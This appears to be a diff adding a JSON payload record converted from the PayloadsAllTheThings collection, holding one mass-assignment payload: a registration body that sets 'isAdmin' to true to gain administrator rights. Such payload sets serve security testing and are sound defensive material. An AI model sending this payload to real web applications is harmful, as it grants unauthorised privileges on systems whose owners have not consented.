@@ -1,0 +1,20 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "mass_assignment",
+  "original_category": "Mass Assignment",
+  "payloads": [
+    {
+      "category": "Methodology",
+      "escalation": "baseline",
+      "lines": [
+        "{",
+        "\"username\": \"attacker\",",
+        "\"email\": \"attacker@email.com\",",
+        "\"password\": \"unsafe_password\",",
+        "\"isAdmin\": true",
+        "}"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.872Z"
+}
